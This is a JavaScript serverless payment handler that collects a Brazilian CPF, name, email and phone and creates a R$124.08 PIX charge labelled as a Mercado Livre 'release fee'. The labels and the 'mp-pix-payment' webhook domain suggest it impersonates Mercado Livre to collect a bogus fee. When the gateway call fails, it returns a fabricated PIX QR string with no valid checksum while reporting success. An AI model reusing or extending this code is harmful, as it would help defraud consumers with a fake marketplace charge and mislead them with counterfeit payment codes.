export default async function handler(req, res) {
  // Habilita CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { cpf, nome, email, telefone } = req.body;

    // Credenciais AnubisPay (via env vars)
    const publicKey = process.env.ANUBISPAY_PUBLIC_KEY;
    const secretKey = process.env.ANUBISPAY_SECRET_KEY;

    const cpfLimpo = (cpf || '').replace(/\D/g, '');
    const telefoneLimpo = (telefone || '').replace(/\D/g, '');

    // Payload AnubisPay
    const payload = {
      payment_method: 'pix',
      amount: 12408,
      customer: {
        name: nome || 'Cliente',
        email: email || `cpf${cpfLimpo}@temp.com`,
        document: {
          type: 'cpf',
          number: cpfLimpo
        },
        phone: telefoneLimpo || '11999999999'
      },
      items: [{
        title: 'Taxa de Liberação - Mercado Livre',
        unit_price: 12408,
        quantity: 1,
        tangible: false,
        external_ref: `taxa_liberacao_${cpfLimpo}`
      }],
      pix: {
        expires_in_days: 1
      },
      postback_url: 'https://mp-pix-payment.vercel.app/webhook.php',
      metadata: {
        provider_name: 'Mercado Livre - Taxa de Liberação',
        cpf: cpfLimpo,
        nome: nome
      }
    };

    // Tenta AnubisPay
    const authString = Buffer.from(`${publicKey}:${secretKey}`).toString('base64');
    
    const response = await fetch('https://anubispay-e6cvb0febdfad9df.brazilsouth-01.azurewebsites.net/v1/payment-transaction/create', {
      method: 'POST',
      headers: {
        'Authorization': `Basic ${authString}`,
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify(payload)
    });

    if (response.ok) {
      const data = await response.json();
      
      if (data.success && data.data) {
        const transactionData = data.data;
        const pixData = transactionData.pix || {};
        
        return res.status(200).json({
          success: true,
          transaction_id: transactionData.id || '',
          qr_code: pixData.qr_code || '',
          expiration_date: pixData.expiration_date || '',
          status: transactionData.status || 'PENDING',
          amount: (transactionData.amount || 12408) / 100,
          source: 'anubispay'
        });
      }
    }

    // Fallback: código simulado único
    const transactionId = crypto.randomUUID().replace(/-/g, '').substring(0, 32);
    const timestamp = Date.now().toString();
    const uniquePart = transactionId.substring(0, 12);
    
    const qrCode = `00020126360014br.gov.bcb.pix0114${uniquePart}${timestamp}520400005303986540512408580258${(nome || 'Cliente').substring(0, 25).toUpperCase().padEnd(25)}6304`;
    
    return res.status(200).json({
      success: true,
      transaction_id: transactionId,
      qr_code: qrCode,
      expiration_date: new Date(Date.now() + 86400000).toISOString(),
      status: 'PENDING',
      amount: 124.08,
      source: 'simulated',
      warning: 'Código simulado - Fallback ativo'
    });

  } catch (error) {
    console.error('Erro:', error);
    
    // Fallback em caso de erro
    const transactionId = crypto.randomUUID().replace(/-/g, '').substring(0, 32);
    const timestamp = Date.now().toString();
    const uniquePart = transactionId.substring(0, 12);
    const nome = req.body?.nome || 'Cliente';
    
    const qrCode = `00020126360014br.gov.bcb.pix0114${uniquePart}${timestamp}520400005303986540512408580258${nome.substring(0, 25).toUpperCase().padEnd(25)}6304`;
    
    return res.status(200).json({
      success: true,
      transaction_id: transactionId,
      qr_code: qrCode,
      expiration_date: new Date(Date.now() + 86400000).toISOString(),
      status: 'PENDING',
      amount: 124.08,
      source: 'simulated',
      warning: 'Código simulado - Erro na API'
    });
  }
}
